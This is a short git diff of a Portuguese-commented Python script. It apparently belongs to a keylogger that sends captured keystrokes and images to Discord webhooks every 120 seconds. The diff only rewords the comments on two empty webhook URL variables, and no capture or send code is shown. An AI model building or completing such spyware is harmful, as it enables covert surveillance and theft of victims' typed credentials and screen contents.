@@ -15,8 +15,8 @@ import io
 from PIL import Image
 
 # WEBHOOK DISCORD 
-webhook_keys_url = ""  # WEBHOOK KEYBOARD
-webhook_media_url = ""  # WEBHOOK IMAGENS
+webhook_keys_url = ""  # URL WEBHOOK PARA KEYBOARD
+webhook_media_url = ""  # URL WEBHOOK PARA IMAGENS
 
 # Definir intervalos de tempo
 interval = 120  # Intervalo de envio das teclas capturadas para 120 segundos
